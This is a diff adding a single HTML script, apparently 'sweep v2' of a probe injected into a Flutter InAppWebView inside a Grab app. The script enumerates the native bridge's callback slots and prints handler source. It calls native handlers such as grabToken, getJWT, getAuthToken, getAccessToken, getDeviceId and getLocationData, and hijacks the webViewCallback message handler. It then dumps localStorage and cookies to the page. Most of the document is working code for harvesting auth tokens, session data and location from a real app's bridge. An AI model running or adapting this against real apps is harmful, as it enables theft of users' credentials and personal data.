@@ -1,0 +1,217 @@
+<script>
+// ================================================================
+// SWEEP v2 — Based on results from v1:
+// - All callHandler returned null (handlers EXIST but returned nothing)
+// - flutter_inappwebview has numbered props 1-15 (callback slots)
+// - webViewCallback.addEventListener registered successfully
+// - DETECT_ADDRESS sent but no RECV captured
+//
+// This version:
+// 1. Dumps the numbered callback slots
+// 2. Inspects _callHandler internals
+// 3. Tries callHandler with different argument patterns
+// 4. Monitors webViewCallback events over time
+// 5. Reads the token injection from localStorage (if native injected it)
+// ================================================================
+
+var R = [];
+function p(label, val) {
+  var s;
+  try { s = label + ' = ' + (typeof val === 'object' && val !== null ? JSON.stringify(val, null, 2) : String(val)); }
+  catch(e) { s = label + ' = [unserializable: ' + e.message + ']'; }
+  R.push(s);
+}
+function h(title) { R.push('\n========== ' + title + ' =========='); }
+
+// ================================================================
+// 1. NUMBERED CALLBACK SLOTS (1-15)
+// These are InAppWebView's handler callback functions
+// When Dart resolves a callHandler, it calls flutter_inappwebview[id](result)
+// ================================================================
+h('flutter_inappwebview NUMBERED SLOTS');
+if (window.flutter_inappwebview) {
+  for (var i = 1; i <= 30; i++) {
+    var slot = window.flutter_inappwebview[String(i)];
+    if (typeof slot !== 'undefined') {
+      p('slot[' + i + ']', typeof slot + (typeof slot === 'function' ? ' → ' + String(slot).substring(0, 100) : ' → ' + String(slot)));
+    }
+  }
+}
+
+// ================================================================
+// 2. INSPECT _callHandler SOURCE
+// ================================================================
+h('flutter_inappwebview._callHandler SOURCE');
+if (window.flutter_inappwebview && window.flutter_inappwebview._callHandler) {
+  p('source', String(window.flutter_inappwebview._callHandler));
+}
+
+// ================================================================
+// 3. INSPECT callHandler SOURCE
+// ================================================================
+h('flutter_inappwebview.callHandler SOURCE');
+if (window.flutter_inappwebview && window.flutter_inappwebview.callHandler) {
+  p('source', String(window.flutter_inappwebview.callHandler));
+}
+
+// ================================================================
+// 4. TRY callHandler WITH ARGUMENTS
+// grabToken might need args; try different patterns
+// ================================================================
+h('callHandler WITH ARGUMENTS');
+
+var attempts = [];
+if (window.flutter_inappwebview && typeof window.flutter_inappwebview.callHandler === 'function') {
+
+  var calls = [
+    // no args (already tried in v1, returned null)
+    ['grabToken'],
+    // with empty object
+    ['grabToken', {}],
+    // with token request
+    ['grabToken', { type: 'request' }],
+    // grabProfile no args
+    ['grabProfile'],
+    // grabProfile with empty array (the FlutterBridge.ts pattern: callHandler(name, ...args))
+    ['grabProfile', []],
+    // getJWT
+    ['getJWT'],
+    ['getJWT', {}],
+    // getAuthToken
+    ['getAuthToken'],
+    ['getAuthToken', {}],
+    // getDeviceId
+    ['getDeviceId'],
+    // getLocationData
+    ['getLocationData'],
+    // getSessionId
+    ['getSessionId'],
+    // Try to read the native-injected JS handlers
+    // From libapp.so: the Dart side uses addJavaScriptHandler
+    // Try some common Grab handler patterns
+    ['getAllowedWebViewHosts'],
+    ['getConfig'],
+    ['getMerchantInfo'],
+    ['getAccessToken'],
+    ['getToken'],
+  ];
+
+  var pending = calls.length;
+
+  calls.forEach(function(args) {
+    var name = args[0];
+    var callArgs = args.slice(1);
+    var label = name + '(' + callArgs.map(function(a) { return JSON.stringify(a); }).join(', ') + ')';
+
+    try {
+      var promise = window.flutter_inappwebview.callHandler.apply(
+        window.flutter_inappwebview, args
+      );
+
+      if (promise && typeof promise.then === 'function') {
+        promise.then(function(result) {
+          p('[OK] ' + label, result);
+          pending--;
+          if (pending <= 0) afterCallHandlers();
+        }).catch(function(err) {
+          p('[ERR] ' + label, String(err));
+          pending--;
+          if (pending <= 0) afterCallHandlers();
+        });
+      } else {
+        p('[SYNC] ' + label, promise);
+        pending--;
+      }
+    } catch(e) {
+      p('[EXC] ' + label, e.message);
+      pending--;
+    }
+  });
+
+  setTimeout(function() {
+    if (pending > 0) {
+      p('TIMEOUT', pending + ' calls did not resolve in 8s');
+      afterCallHandlers();
+    }
+  }, 8000);
+
+} else {
+  p('STATUS', 'flutter_inappwebview not available');
+  afterCallHandlers();
+}
+
+// ================================================================
+// 5. MONITOR webViewCallback EVENTS
+// ================================================================
+function afterCallHandlers() {
+
+  h('webViewCallback EVENT MONITOR');
+
+  if (window.webViewCallback) {
+    // Intercept ALL onmessage
+    var origOnmessage = window.webViewCallback.onmessage;
+    var received = [];
+
+    window.webViewCallback.onmessage = function(event) {
+      var parsed;
+      try { parsed = JSON.parse(event.data); } catch(e) { parsed = event.data; }
+      received.push(parsed);
+      p('[RECV] onmessage', parsed);
+      if (origOnmessage) origOnmessage(event);
+    };
+
+    // Send DETECT_ADDRESS and wait for response
+    p('[SEND] DETECT_ADDRESS', '{"action":"DETECT_ADDRESS","scope":"MEX"}');
+    window.webViewCallback.postMessage(JSON.stringify({ action: 'DETECT_ADDRESS', scope: 'MEX' }));
+
+    setTimeout(function() {
+      if (received.length === 0) {
+        p('[INFO] DETECT_ADDRESS', 'no response received after 5s');
+      }
+      finalize();
+    }, 5500);
+
+  } else {
+    finalize();
+  }
+}
+
+// ================================================================
+// 6. LOCALSTORAGE + COOKIES (what native injected)
+// ================================================================
+function finalize() {
+  h('localStorage (native-injected tokens)');
+  if (localStorage.length === 0) {
+    p('STATUS', 'EMPTY — native did not inject tokens to this page');
+  }
+  for (var i = 0; i < localStorage.length; i++) {
+    var k = localStorage.key(i);
+    p(k, localStorage.getItem(k));
+  }
+
+  h('COOKIES');
+  if (!document.cookie) {
+    p('STATUS', 'EMPTY');
+  } else {
+    document.cookie.split(';').forEach(function(c) {
+      var parts = c.trim().split('=');
+      p(parts[0], decodeURIComponent(parts.slice(1).join('=')));
+    });
+  }
+
+  h('NUMBERED SLOTS AFTER ALL CALLS');
+  if (window.flutter_inappwebview) {
+    for (var j = 1; j <= 50; j++) {
+      var slot = window.flutter_inappwebview[String(j)];
+      if (typeof slot !== 'undefined') {
+        p('slot[' + j + ']', typeof slot);
+      }
+    }
+  }
+
+  // FLUSH
+  document.open();
+  document.write('<pre style="font-size:11px;white-space:pre-wrap;word-break:break-all">' + R.join('\n') + '</pre>');
+  document.close();
+}
+</script>
